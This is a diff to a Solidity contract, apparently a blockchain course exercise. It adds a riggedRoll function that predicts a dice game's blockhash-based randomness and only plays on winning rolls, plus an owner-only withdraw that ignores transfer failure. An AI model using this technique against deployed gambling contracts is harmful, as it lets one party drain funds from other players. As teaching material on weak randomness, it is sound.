@@ -14,11 +14,32 @@ contract RiggedRoll is Ownable {
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
+        (bool sent, ) = _addr.call{value: _amount}("");
+    }
 
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        uint256 minValue = 0.002 * 10 * 1000000000000000000;
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
+        console.log('\t',"   Dice Game Roll:",roll);
+        console.logBytes32(prevHash);
+        console.logBytes32(hash);
+        console.log(address(diceGame));
+
+        // If roll > 2, don't roll the dice
+        if (roll > 2) {
+            return;
+        }
+
+        diceGame.rollTheDice{value: minValue, gas: 500000}();
+    }
 
 
     //Add receive() function so contract can receive Eth
+    receive() external payable { }
     
 }
